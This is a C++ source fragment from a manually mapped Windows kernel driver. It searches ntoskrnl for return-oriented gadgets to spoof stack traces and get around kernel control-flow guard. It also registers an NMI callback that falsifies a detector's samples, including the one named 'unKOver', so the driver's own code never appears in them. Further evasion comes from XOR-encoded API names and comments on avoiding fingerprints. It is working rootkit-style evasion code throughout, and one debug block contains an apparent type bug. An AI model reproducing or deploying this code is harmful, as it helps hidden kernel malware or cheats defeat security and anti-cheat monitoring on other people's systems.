// trampoline uses it to restore the real RSP and return to the mapped caller.
static uint64_t PostboxNmiFindPopRspRet(address Nt, uint64_t NtSize)
{
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + 1 < Sections[i].Size; ++j)
            if (P[j] == 0x5C && P[j + 1] == 0xC3) return Sections[i].Va + j;
    }
    return 0;
}

// First 48 83 C4 28 C3 (add rsp, 0x28; ret) in an executable nt section.
// Chained with the pop-rsp-ret gadget: the add skips the target return address
// and the 0x20-byte shadow space, then the ret jumps to pop-rsp-ret, which
// restores the real RSP from fake+0x38. A callee may spill its register
// arguments into the shadow space without corrupting the restore chain.
static uint64_t PostboxNmiFindPopRspRetSkip(address Nt, uint64_t NtSize)
{
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + 4 < Sections[i].Size; ++j)
            if (P[j] == 0x48 && P[j + 1] == 0x83 && P[j + 2] == 0xC4 &&
                P[j + 3] == 0x28 && P[j + 4] == 0xC3)
                return Sections[i].Va + j;
    }
    return 0;
}

// First 41 FF 66 83 (jmp qword ptr [r14-0x7d]) in an executable nt section.
// The shadow thunk points r14 at its per-call frame's trampoline slot +0x7d, so
// this gadget jumps to the mapped return trampoline without putting the
// trampoline address on the visible stack.
static uint64_t PostboxNmiFindShadowJumpGadget(address Nt, uint64_t NtSize)
{
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + 3 < Sections[i].Size; ++j)
            if (P[j] == 0x41 && P[j + 1] == 0xFF && P[j + 2] == 0x66 && P[j + 3] == 0x83)
                return Sections[i].Va + j;
    }
    return 0;
}

// First `jmp qword ptr [rcx]` (FF 21) or `jmp qword ptr [rcx+0]` (FF 61 00)
// A gadget is accepted only when its address is covered by an nt exception
// directory entry (BeginAddress <= Address < EndAddress). This build has no
// exact function-entry `jmp [rcx]` thunk, but the covered mid-function thunk
// has valid unwind coverage (RtlLookupFunctionEntry finds its function). The
// test-only POSTBOX_ALLOW_MID_FUNCTION_GADGETS switch bypasses the check.
struct PostboxRuntimeFunction
{
    uint32_t BeginAddress;
    uint32_t EndAddress;
    uint32_t UnwindInfoAddress;
};
static_assert(sizeof(PostboxRuntimeFunction) == 12, "RUNTIME_FUNCTION layout changed");

// Return the nt exception-directory array and its entry count. Null when the
// image headers or the directory bounds are invalid.
static const PostboxRuntimeFunction* PostboxNtRuntimeFunctions(
    address Nt, uint64_t NtSize, uint32_t* Count)
{
    if (Count) *Count = 0;
    if (!Nt || !NtSize) return nullptr;
    const auto* Dos = (const _IMAGE_DOS_HEADER*) (uintptr_t) Nt;
    if (Dos->e_magic != 0x5A4D) return nullptr;
    const auto* Nth = (const _IMAGE_NT_HEADERS64*)
        __builtin_assume_aligned((const uint8_t*) (uintptr_t) Nt + Dos->e_lfanew, 8);
    if (Nth->Signature != 0x00004550) return nullptr;
    const auto& Dir = Nth->OptionalHeader.DataDirectory[3];   // EXCEPTION
    if (!Dir.VirtualAddress || Dir.Size < sizeof(PostboxRuntimeFunction) ||
        (uint64_t) Dir.VirtualAddress + Dir.Size > NtSize)
        return nullptr;
    const auto* Entries = (const PostboxRuntimeFunction*)
        __builtin_assume_aligned((const uint8_t*) (uintptr_t) Nt + Dir.VirtualAddress, 4);
    if (Count) *Count = Dir.Size / sizeof(PostboxRuntimeFunction);
    return Entries;
}

static bool PostboxNtFunctionEntry(address Nt, uint64_t NtSize, uint64_t Address)
{
#ifdef POSTBOX_ALLOW_MID_FUNCTION_GADGETS
    (void) Nt; (void) NtSize; (void) Address;
    return true;
#else
    if (!Nt || !NtSize || Address < Nt || Address >= Nt + NtSize) return false;
    uint32_t Count = 0;
    const PostboxRuntimeFunction* const Entries =
        PostboxNtRuntimeFunctions(Nt, NtSize, &Count);
    if (!Entries) return false;
    const uint32_t Want = (uint32_t) (Address - (uint64_t) (uintptr_t) Nt);
    uint32_t Lo = 0, Hi = Count;
    while (Lo < Hi)
    {
        const uint32_t Mid = Lo + (Hi - Lo) / 2;
        if (Entries[Mid].BeginAddress <= Want) Lo = Mid + 1;
        else Hi = Mid;
    }
    if (Lo == 0) return false;
    const PostboxRuntimeFunction& Entry = Entries[Lo - 1];
    return Entry.BeginAddress <= Want && Want < Entry.EndAddress;
#endif
}

// in an executable nt section. ExpWorkerThread calls WorkerRoutine(Parameter)
// with RCX = Parameter, so the work item can name an nt thunk and keep the
// mapped entry in the detached context.
static uint64_t PostboxNmiFindWorkJumpGadget(address Nt, uint64_t NtSize)
{
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + 2 < Sections[i].Size; ++j)
            if (P[j] == 0xFF && P[j + 1] == 0x21)
            {
                const uint64_t Gadget = Sections[i].Va + j;
                if (PostboxNtFunctionEntry(Nt, NtSize, Gadget)) return Gadget;
            }
        for (uint64_t j = 0; j + 2 < Sections[i].Size; ++j)
            if (P[j] == 0xFF && P[j + 1] == 0x61 && P[j + 2] == 0x00)
            {
                const uint64_t Gadget = Sections[i].Va + j;
                if (PostboxNtFunctionEntry(Nt, NtSize, Gadget)) return Gadget;
            }
    }
    return 0;
}

// First dereferencing DPC thunk: `jmp qword ptr [rdx]` (FF 22),
// `jmp qword ptr [rdx+disp8]` (FF 62 xx), or `mov rax,[rdx]; jmp rax`.
// At DPC entry RDX = DeferredContext; DeferredContext can point at a context
// whose first qword is the mapped DPC routine, so the KDPC field holds a data
// pointer rather than the mapped code address.
// First tiny nt function that queues a WORK_QUEUE_ITEM at [DeferredContext+disp]
// through ExQueueWorkItem. PfSnPowerBoostDpc is exactly:
//   sub rsp,28h; lea rcx,[rdx+88h]; xor edx,edx; call ExQueueWorkItem;
//   add rsp,28h; ret
// Its DeferredRoutine is a real function entry, so the KDPC chain contains no
// mapped code: the queued item's WorkerRoutine is the nt jmp-[rcx] thunk and
// its Parameter is the pool context.
static uint64_t PostboxNmiFindDpcQueueFunction(address Nt, uint64_t NtSize,
                                               address ExQueue, uint32_t* Disp)
{
    if (Disp) *Disp = 0;
    if (!Nt || !NtSize || !ExQueue) return 0;
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + 23 <= Sections[i].Size; ++j)
        {
            if (P[j] != 0x48 || P[j+1] != 0x83 || P[j+2] != 0xEC || P[j+3] != 0x28) continue;
            if (P[j+4] != 0x48 || P[j+5] != 0x8D || P[j+6] != 0x8A) continue;
            const uint32_t D = (uint32_t) P[j+7] | ((uint32_t) P[j+8] << 8) |
                               ((uint32_t) P[j+9] << 16) | ((uint32_t) P[j+10] << 24);
            if (P[j+11] != 0x33 || P[j+12] != 0xD2 || P[j+13] != 0xE8) continue;
            const int32_t Rel = (int32_t) ((uint32_t) P[j+14] | ((uint32_t) P[j+15] << 8) |
                                           ((uint32_t) P[j+16] << 16) | ((uint32_t) P[j+17] << 24));
            const uint64_t Call = (uint64_t) (Sections[i].Va + j + 18 + (int64_t) Rel);
            if (Call != (uint64_t) ExQueue) continue;
            if (P[j+18] != 0x48 || P[j+19] != 0x83 || P[j+20] != 0xC4 ||
                P[j+21] != 0x28 || P[j+22] != 0xC3) continue;
            const uint64_t Func = Sections[i].Va + j;
            if (!PostboxNtFunctionEntry(Nt, NtSize, Func)) continue;
            if (Disp) *Disp = D;
            return Func;
        }
    }
    return 0;
}

// Exact .pdata BeginAddress check for the UMS stack-restore thunk.
static bool PostboxNtExactEntry(address Nt, uint64_t NtSize, uint64_t Address)
{
    if (!Nt || !NtSize || Address < Nt || Address >= Nt + NtSize) return false;
    uint32_t Count = 0;
    const PostboxRuntimeFunction* const Entries =
        PostboxNtRuntimeFunctions(Nt, NtSize, &Count);
    if (!Entries) return false;
    const uint32_t Want = (uint32_t) (Address - (uint64_t) (uintptr_t) Nt);
    uint32_t Lo = 0, Hi = Count;
    while (Lo < Hi)
    {
        const uint32_t Mid = Lo + (Hi - Lo) / 2;
        if (Entries[Mid].BeginAddress < Want) Lo = Mid + 1;
        else Hi = Mid;
    }
    return Lo < Count && Entries[Lo].BeginAddress == Want;
}

// Exact-entry event-thread start dispatcher: nt!KiUmsRestoreUch. It restores a
// UMS frame onto the thread InitialStack, sets RSP to InitialStack-0x110,
// restores RCX from [context], and jumps to [context+0x38]. That bypasses KCFG
// for the mapped target; the StartRoutine itself is the exact nt entry.
static uint64_t PostboxNmiFindUmsRestore(address Nt, uint64_t NtSize)
{
    static const uint8_t Pattern[] = {
        0xFA, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x7A, 0x28, 0x48, 0x8D, 0xAF, 0xF0, 0xFE, 0xFF,
        0xFF, 0x48, 0x83, 0xEF, 0x08, 0x48, 0x8B, 0x71, 0x20, 0x48,
        0x83, 0xEE, 0x08, 0x48, 0x8B, 0xD1, 0x48, 0x8B, 0x49, 0x30,
        0x48, 0xC1, 0xE9, 0x03, 0xFD, 0xF3, 0x48, 0xA5, 0xFC, 0x48,
        0x8D, 0x67, 0x08, 0x48, 0x8B, 0xCA, 0x48, 0x8B, 0x51, 0x38,
        0xFF, 0xE2
    };
    if (!Nt || !NtSize) return 0;
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j + sizeof(Pattern) <= Sections[i].Size; ++j)
        {
            bool Match = true;
            for (uint32_t k = 0; k < sizeof(Pattern); ++k)
                if (P[j + k] != Pattern[k]) { Match = false; break; }
            if (!Match) continue;
            const uint64_t Func = Sections[i].Va + j;
            if (PostboxNtExactEntry(Nt, NtSize, Func)) return Func;
        }
    }
    return 0;
}

// First .pdata function whose entire body is one byte, 0xC3 (`ret`). The
// exact-entry terminal chain uses this real nt entry as the one-qword step
// between MmFreeIndependentPages and PsTerminateSystemThread: MmFree returns
// to the thunk with RSP 0 mod 16, the thunk pops PsTerminate with RSP 8 mod 16.
// A one-byte function has no prologue/unwind state to disturb that frame.
static uint64_t PostboxNmiFindRetThunk(address Nt, uint64_t NtSize)
{
    uint32_t Count = 0;
    const PostboxRuntimeFunction* const Entries =
        PostboxNtRuntimeFunctions(Nt, NtSize, &Count);
    if (!Entries) return 0;
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint32_t Begin = Entries[i].BeginAddress;
        const uint32_t End = Entries[i].EndAddress;
        if (End <= Begin || End - Begin != 1 || Begin >= NtSize) continue;
        const uint8_t* P = (const uint8_t*) (uintptr_t) Nt + Begin;
        if (P[0] == 0xC3) return (uint64_t) (uintptr_t) Nt + Begin;
    }
    return 0;
}

// First .pdata function whose body is exactly `add rsp,0x28; ret` (48 83 C4 28
// C3). MmFreeIndependentPages spills RBX into the ABI shadow space at [rsp+8],
// so the event terminal chain enters the skip thunk with RSP = terminal-0x20;
// the add steps over the 0x28-byte shadow frame, then ret pops the exact-entry
// ret thunk and PsTerminateSystemThread with 8-mod-16 alignment at each entry.
static uint64_t PostboxNmiFindSkipThunk(address Nt, uint64_t NtSize)
{
    uint32_t Count = 0;
    const PostboxRuntimeFunction* const Entries =
        PostboxNtRuntimeFunctions(Nt, NtSize, &Count);
    if (!Entries) return 0;
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint32_t Begin = Entries[i].BeginAddress;
        const uint32_t End = Entries[i].EndAddress;
        if (End <= Begin || End - Begin < 5 || Begin + 5 > NtSize) continue;
        const uint8_t* P = (const uint8_t*) (uintptr_t) Nt + Begin;
        if (P[0] == 0x48 && P[1] == 0x83 && P[2] == 0xC4 &&
            P[3] == 0x28 && P[4] == 0xC3)
            return (uint64_t) (uintptr_t) Nt + Begin;
    }
    return 0;
}
#endif

// Redirect a mapped interrupted RIP to an nt ret gadget. The original RIP is
// written just below the interrupted RSP; the gadget pops it and resumes the
// mapped code with the original RSP. No IDT/TSS change; only the saved frame.
static void PostboxNmiFrameTrampoline(PostboxState* S, PostboxMachineFrame* Frame,
                                      uint64_t StackLimit, uint64_t StackBase)
{
    if (!Frame || !S->NmiSanitize.RetGadget) return;
    const uint64_t Rip = Frame->Rip;
    if (Rip < S->NmiSanitize.ImageBase ||
        Rip >= S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize) return;
    const uint64_t Rsp = Frame->Rsp;
    if (!StackLimit || !StackBase || Rsp <= StackLimit || Rsp > StackBase ||
        Rsp - 8 < StackLimit) return;
    *(uint64_t*) (uintptr_t) (Rsp - 8) = Rip;
    Frame->Rip = S->NmiSanitize.RetGadget;
    Frame->Rsp = Rsp - 8;
}

extern "C" uint8_t PostboxNmiSanitizeCallback(void* Context, uint8_t Handled,
                                               uint64_t EntryRsp, uint64_t RetAddr)
{
    (void) Handled;
    // The callback is registered with a null context. Resolve the state from the
    // image global so the KNMI node carries no pointer to the state page.
    (void) Context;
    auto* S = PostboxStatePtr;
    if (!S || !S->NmiSanitize.Active || !S->NmiSanitize.ListHead) return 1;

    const uint64_t Kpcr = __readmsr(0xC0000101);
    uint64_t StackLimit = 0;
    uint64_t StackBase = 0;
    void* Thread = *(void**) (uintptr_t) (Kpcr + 0x188);
    if (Thread)
    {
        StackLimit = PostboxReadUnaligned<uint64_t>((uint8_t*) Thread + 0x30);
        StackBase = PostboxReadUnaligned<uint64_t>((uint8_t*) Thread + 0x38);
    }
    uint64_t InterruptedRip = 0;
    auto* Tss = *(PostboxTss64**) (uintptr_t) (Kpcr + 8);
    if (Tss && Tss->Ist3)
    {
        auto* Frame = (PostboxMachineFrame*)
            (uintptr_t) (Tss->Ist3 - sizeof(PostboxMachineFrame));
        InterruptedRip = Frame->Rip;
        PostboxNmiFrameTrampoline(S, Frame, StackLimit, StackBase);
    }
    const bool Mapped = InterruptedRip >= S->NmiSanitize.ImageBase &&
                        InterruptedRip < S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize;

    uint32_t Core = 0;
    if (S->NmiSanitize.GetProc)
        Core = ((FnNmiGetProc) S->NmiSanitize.GetProc)(nullptr);
    if (Core >= 64) return 1;

    const uint64_t DetectorBase = S->NmiSanitize.DetectorBase;
    const uint64_t DetectorEnd = DetectorBase + S->NmiSanitize.DetectorSize;
    if (!DetectorBase || !S->NmiSanitize.DetectorSize) return 1;

    uint64_t Entry = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
    for (uint32_t i = 0; i < 64 && Entry; ++i)
    {
        const uint64_t Next = *(uint64_t*) (uintptr_t) Entry;
        const uint64_t CallbackFn = *(uint64_t*) (uintptr_t) (Entry + 8);
        const uint64_t Ctx = *(uint64_t*) (uintptr_t) (Entry + 0x10);
        if (CallbackFn >= DetectorBase && CallbackFn < DetectorEnd && Ctx)
        {
            // N-11: validate the context layout before touching the detector's
            // record. A changed/foreign context must not be corrupted.
            if (!PostboxNmiContextLooksLikeDetector(S, Ctx, Core)) return 1;

            // This sanitizer can run twice per NMI: the newest entry runs before
            // the detector and rewrites the trap frame; the oldest entry runs
            // after the detector has stored its sample. The frame rewrite makes
            // the second pass see Mapped == false, so the record must be scanned
            // unconditionally. Only mapped values are replaced, which keeps a
            // real nt sample untouched (no all-identical time-series tell).
            const uint64_t ImageEnd =
                S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize;
            bool Wrote = false;
            if (S->NmiSanitize.DetectorKind == 2)
            {
                // unKOver NMI_CONTEXT: rewrite interrupted RIP/RSP and any mapped
                // stack frames, but preserve threadId/numFired/frames.
                auto* Base = (uint8_t*) (uintptr_t) Ctx + (uint64_t) Core * 0x120ull;
                uint64_t NmiRip = PostboxReadUnaligned<uint64_t>(Base + 0x10);
                uint64_t NmiRsp = PostboxReadUnaligned<uint64_t>(Base + 0x18);
                if (NmiRip >= S->NmiSanitize.ImageBase && NmiRip < ImageEnd)
                {
                    NmiRip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
                    PostboxWriteUnaligned<uint64_t>(Base + 0x10, NmiRip);
                    Wrote = true;
                }
                if (Mapped && EntryRsp >= 0xFFFF800000000000ull)
                {
                    NmiRsp = EntryRsp;
                    PostboxWriteUnaligned<uint64_t>(Base + 0x18, NmiRsp);
                }
                uint16_t Frames = PostboxReadUnaligned<uint16_t>(Base + 8);
                if (Frames > 32) Frames = 32;
                for (uint32_t f = 0; f < Frames; ++f)
                {
                    const uint64_t Slot = PostboxReadUnaligned<uint64_t>(
                        Base + 0x20 + f * 8);
                    if (Slot >= S->NmiSanitize.ImageBase && Slot < ImageEnd)
                    {
                        PostboxWriteUnaligned<uint64_t>(
                            Base + 0x20 + f * 8, S->NmiSanitize.NtBase);
                        Wrote = true;
                    }
                }
#ifdef NMI_PROBE
                if (Wrote)
                {
                    S->NmiSanitize.Writes++;
                    S->NmiSanitize.LastCount =
                        PostboxReadUnaligned<uint32_t>(Base + 4);
                    S->NmiSanitize.LastUser = 0;
                    S->NmiSanitize.LastCore = Core;
                    S->NmiSanitize.LastRip = *NmiRip;
                    S->NmiSanitize.LastRsp = *NmiRsp;
                }
#endif
            }
            else
            {
                auto* Nmi = (PostboxDetectorNmiContext*) (uintptr_t) Ctx;
                if (Nmi[Core].Rip >= S->NmiSanitize.ImageBase && Nmi[Core].Rip < ImageEnd)
                {
                    Nmi[Core].Rip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
                    Wrote = true;
                }
                if (Mapped && EntryRsp >= 0xFFFF800000000000ull)
                    Nmi[Core].Rsp = EntryRsp;
                // N-12: preserve the detector's real sample count and user flag.
                // Forcing 1/0 on every record is a time-series tell.
                if (Wrote && Nmi[Core].Count < 1) Nmi[Core].Count = 1;
#ifdef NMI_PROBE
                if (Wrote)
                {
                    S->NmiSanitize.Writes++;
                    S->NmiSanitize.LastCount = Nmi[Core].Count;
                    S->NmiSanitize.LastUser = Nmi[Core].User;
                    S->NmiSanitize.LastCore = Core;
                    S->NmiSanitize.LastRip = Nmi[Core].Rip;
                    S->NmiSanitize.LastRsp = Nmi[Core].Rsp;
                }
#endif
            }
            return 1;
        }
        Entry = Next;
    }
    return 1;
}

static bool PostboxNmiListHasDetector(PostboxState* S)
{
    const uint64_t DetectorBase = S->NmiSanitize.DetectorBase;
    const uint64_t DetectorEnd = DetectorBase + S->NmiSanitize.DetectorSize;
    if (!DetectorBase || !S->NmiSanitize.DetectorSize || !S->NmiSanitize.ListHead)
        return false;
    uint64_t Entry = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
    for (uint32_t i = 0; i < 64 && Entry; ++i)
    {
        const uint64_t CallbackFn = *(uint64_t*) (uintptr_t) (Entry + 8);
        if (CallbackFn >= DetectorBase && CallbackFn < DetectorEnd) return true;
        Entry = *(uint64_t*) (uintptr_t) Entry;
    }
    return false;
}

// True when our entry is older than the detector's entry (detector runs first).
[[maybe_unused]] static bool PostboxNmiOrderOk(PostboxState* S, uint64_t Self)
{
    uint64_t Entry = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
    bool SeenSelf = false;
    for (uint32_t i = 0; i < 64 && Entry; ++i)
    {
        const uint64_t CallbackFn = *(uint64_t*) (uintptr_t) (Entry + 8);
        if (CallbackFn == Self)
        {
            SeenSelf = true;
        }
        else if (SeenSelf && S->NmiSanitize.DetectorBase &&
                 CallbackFn >= S->NmiSanitize.DetectorBase &&
                 CallbackFn < S->NmiSanitize.DetectorBase + S->NmiSanitize.DetectorSize)
        {
            return false;   // detector is after us: we would run first
        }
        Entry = *(uint64_t*) (uintptr_t) Entry;
    }
    return true;
}

// N-10/N-09: refresh the detector range from PASSIVE context (init or the
// work routine), never from the NMI callback. The common case is cheap: if the
// current range still owns a registered callback, nothing changes. A rename or
// a late load falls through to the name match, then to the callback-property
// match.
static void PostboxNmiRefreshDetector(PostboxState* S)
{
    if (!S || !S->NmiSanitize.ListHead) return;
    if (PostboxNmiListHasDetector(S)) return;
    PostboxNmiFindDetector(S);
    if (PostboxNmiListHasDetector(S)) return;
    PostboxNmiFindDetectorByCallback(S);
}

#ifdef NMI_FRAME_FIRST
// Pre-callback ordering. The detector registers its callback per IOCTL, so its
// entry is newer and normally runs first. This PASSIVE monitor registers a fresh
// sanitizer entry whenever the list head is not ours, making the frame
// trampoline run before the detector's callback. It never deregisters under a
// live callback; the handles are released at stop.
// One monitor pass. PostboxWorkRoutine runs this on the existing worker with
// kernel APCs disabled; there is no dedicated monitor thread.
static void PostboxNmiMonitorStep(PostboxState* S)
{
#ifndef POSTBOX_NMI_ALLOW_MAPPED_CALLBACK
    (void)S;
    return;
#else
    if (!S || !__atomic_load_n(&S->NmiSanitize.Active, __ATOMIC_ACQUIRE))
        return;

    const uint64_t Head = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
    if (Head)
    {
        const uint64_t Fn = *(uint64_t*) (uintptr_t) (Head + 8);
        if (Fn != (uint64_t) (uintptr_t) &PostboxNmiSanitizeEntry &&
            S->NmiSanitize.DetectorBase &&
            S->NmiSanitize.Register && S->NmiSanitize.Deregister)
        {
            void* H = ((FnNmiRegister) S->NmiSanitize.Register)(
                &PostboxNmiSanitizeEntry, nullptr);
            if (H)
            {
                // Keep exactly one sanitizer node. Register the fresh head
                // first, then release the previous node; a list walk sees at
                // most the new node and the old one for the deregister window,
                // not a growing pile of mapped callbacks.
                const uint64_t Old = S->NmiSanitize.Handle;
                S->NmiSanitize.Handle = (uint64_t) (uintptr_t) H;
                if (Old && Old != S->NmiSanitize.Handle)
                    ((FnNmiDeregister) S->NmiSanitize.Deregister)(
                        (void*) (uintptr_t) Old);
            }
        }
    }
#endif
}

#endif

#if defined(STACK_SPOOF) && defined(POSTBOX_KEEP_THREAD_SPOOF)
// Test-only APC-stackwalk thread-loop setup; absent from the stealth image.
[[maybe_unused]] static bool PostboxInitThreadLoop(PostboxThreadLoopContext* C,
                                                   PostboxState* S, uint64_t Step,
                                                   int64_t Interval)
{
    if (!C || !S || !Step || !g_PostboxPopRspRet || !g_PostboxPopRspRetSkip)
        return false;
    if (!S->Imports.KeDelayExecutionThread || !S->Imports.KeEnterCriticalRegion ||
        !S->Imports.KeLeaveCriticalRegion)
        return false;
    C->State = (uint64_t) (uintptr_t) S;
    C->Step = Step;
    C->WaitTarget = (uint64_t) (uintptr_t) PostboxImportFrom(
        S, S->Imports.KeDelayExecutionThread);
    C->WaitInterval = Interval;
    C->EnterCritical = (uint64_t) (uintptr_t) PostboxImportFrom(
        S, S->Imports.KeEnterCriticalRegion);
    C->LeaveCritical = (uint64_t) (uintptr_t) PostboxImportFrom(
        S, S->Imports.KeLeaveCriticalRegion);
    return true;
}
#endif

// N-10: activate the sanitizer once a detector is present. Called from init and
// from the PASSIVE work routine, never from the NMI callback. Registration is
// detector-gated so a system with no detector gets no KNMI node/ETW event.
static bool PostboxNmiTryActivate(PostboxState* S)
{
#ifndef POSTBOX_NMI_ALLOW_MAPPED_CALLBACK
    (void)S;
    return false;
#else
    if (!S) return false;
    auto& N = S->NmiSanitize;
    if (N.Active) return true;
    if (!N.Ready || !N.Register || !N.Deregister || !N.ListHead) return false;

    PostboxNmiRefreshDetector(S);
    if (!N.DetectorBase || !N.DetectorSize) return false;

    for (uint32_t Attempt = 0; Attempt < 4; ++Attempt)
    {
        // Let a detector poll that is already in flight finish before registering,
        // so our entry is older than the detector's next per-IOCTL entry.
        _LARGE_INTEGER Delay{};
        Delay.QuadPart = -10 * 10000;
        for (uint32_t i = 0; i < 50 && PostboxNmiListHasDetector(S); ++i)
            PostboxDelayExecutionThread(0, 0, &Delay);

        void* Handle = ((FnNmiRegister) N.Register)(&PostboxNmiSanitizeEntry, nullptr);
        if (!Handle) return false;
        N.Handle = (uint64_t) (uintptr_t) Handle;

        if (PostboxNmiOrderOk(S, (uint64_t) (uintptr_t) &PostboxNmiSanitizeEntry))
        {
            N.Active = 1;
            // Re-registration at the list head is done by PostboxNmiMonitorStep
            // from PostboxWorkRoutine on the existing worker thread.
            return true;
        }

        ((FnNmiDeregister) N.Deregister)(Handle);
        N.Handle = 0;
    }
    return false;
#endif
}

static bool PostboxNmiSanitizeInit(PostboxState* S, uint64_t ImageBase, uint64_t ImageSize)
{
    (void) ImageBase;
    (void) ImageSize;
    if (!S) return false;
    auto& N = S->NmiSanitize;
    __builtin_memset(&N, 0, sizeof(N));

#ifndef POSTBOX_NMI_ALLOW_MAPPED_CALLBACK
    // Fail closed: the only available callback routine is mapped image code.
    // Registering it would leave an unbacked pointer in KiNmiCallbackListHead,
    // which is a direct fingerprint. Leave Ready=0 so the PASSIVE worker
    // never retries activation and no KNMI node is created.
    return true;
#else
    const address Nt = GetNtoskrnl();
    if (!Nt) return false;

    // N-21: decode the encoded NMI API names into a stack buffer for one export
    // walk, then wipe the plaintext. The image's .rdata only carries the
    // XOR-SEED form.
    char Decoded[3][40] = {};
    const char* Names[3] = { Decoded[0], Decoded[1], Decoded[2] };
    for (uint32_t i = 0; i < 3; ++i)
        PostboxNmiDecodeName(EncodedNmiApis[i], Decoded[i], sizeof(Decoded[i]));
    address Functions[3] = {};
    FindFuncExportsBatch(Nt, Names, Functions, 3);
    PostboxNmiWipe(Decoded, sizeof(Decoded));
    const address Register = Functions[0];
    const address Deregister = Functions[1];
    const address GetProc = Functions[2];
    if (!Register || !Deregister || !GetProc) return false;

    const uint64_t ListHead = PostboxNmiFindListHead(Register);
    if (!ListHead) return false;

    N.Register = Register;
    N.Deregister = Deregister;
    N.GetProc = GetProc;
    N.ListHead = ListHead;
    N.ImageBase = ImageBase;
    N.ImageSize = ImageSize;
    PostboxNmiFindNt(S, Nt);
    N.RetGadget = PostboxNmiFindRetGadget(Nt, N.NtSize);
#ifdef STACK_SPOOF
    N.PopRspRet = PostboxNmiFindPopRspRet(Nt, N.NtSize);
    N.PopRspRetSkip = PostboxNmiFindPopRspRetSkip(Nt, N.NtSize);
    N.ShadowJumpGadget = PostboxNmiFindShadowJumpGadget(Nt, N.NtSize);
    // The monitor thread can be created from PostboxNmiTryActivate below, before
    // PostboxStart's later assignment. Publish the gadget first so the APC
    // stackwalk loop is selected on the first activation.
    g_PostboxPopRspRet = N.PopRspRet;
    g_PostboxPopRspRetSkip = N.PopRspRetSkip;
#endif
    N.Ready = 1;
    PostboxNmiRefreshDetector(S);

    // No detector yet: stay ready but inactive. The PASSIVE work routine retries
    // activation when a detector loads, so a late load is not bypassed and a
    // system with no detector gets no KNMI node/ETW event.
    if (!N.DetectorBase || !N.DetectorSize) return true;

    PostboxNmiTryActivate(S);
    return true;
#endif
}

static void PostboxNmiSanitizeStop(PostboxState* S)
{
    if (!S || !S->NmiSanitize.Ready) return;

    // The monitor/refresh now run on the mailbox worker, which is the caller of
    // this routine. Clear Active first so no further monitor step registers a
    // callback after the handles below are released.
    S->NmiSanitize.Active = 0;
    _LARGE_INTEGER MonitorDelay{};
    MonitorDelay.QuadPart = -20 * 10000;
    PostboxDelayExecutionThread(0, 0, &MonitorDelay);

    if (S->NmiSanitize.Handle && S->NmiSanitize.Deregister)
    {
        const int32_t Status = ((FnNmiDeregister) S->NmiSanitize.Deregister)(
            (void*) (uintptr_t) S->NmiSanitize.Handle);
        if (Status < 0)
        {
            // The callback may still be registered. Keep the state and handle so
            // the page is not wiped under a live callback; the caller must not
            // free the image in this case.
            return;
        }
    }
    S->NmiSanitize.Handle = 0;
    S->NmiSanitize.Active = 0;
    __builtin_memset(&S->NmiSanitize, 0, sizeof(S->NmiSanitize));
}
#endif

// Apply the loader-built section map to the image block. The header and
// .pdata/.reloc are zeroed in the mapped image, so this map is the only source of
// section permissions. Every page from ImageBase to the page-rounded end of the
// pool block is covered: .text RX, writable sections RW/NX, everything else
// (header, .rdata, .pdata, .reloc, .pbox, padding) R/NX. No page is left RWX.
uint32_t PostboxStartFailure = 0;

bool ProtectImageSectionsLayout(const PostboxImageLayout* Layout, bool FlushAllCpus = true,
                                bool VerifyOnly = false)
{
    PostboxStartFailure = 20;
    if (!Layout || Layout->Magic != PostboxLayoutMagic ||
        Layout->Version != PostboxLayoutVersion)
    {
        print(ERROR("Postbox: image layout missing or invalid"));
        return false;
    }

    const PostboxImageLayout& L = *Layout;
    if (L.ImageSize == 0 || L.AllocSize == 0 || L.SectionCount == 0 ||
        L.SectionCount > PostboxMaxSections || L.NtoskrnlBase == 0)
    {
        PostboxStartFailure = 21;
        return false;
    }

    // Bound the loader-supplied allocation before walking PTEs: a malformed
    // layout must not make the driver rewrite or IPI-flush an arbitrary kernel
    // range. The loader caps the PE image well below this.
    constexpr uint64_t PostboxLayoutMaxBytes = 0x10000000;   // 256 MiB
    if (L.ImageSize > PostboxLayoutMaxBytes || L.AllocSize > PostboxLayoutMaxBytes ||
        L.ImageSize > L.AllocSize || L.RawBase + L.AllocSize < L.RawBase)
    {
        PostboxStartFailure = 24;
        return false;
    }

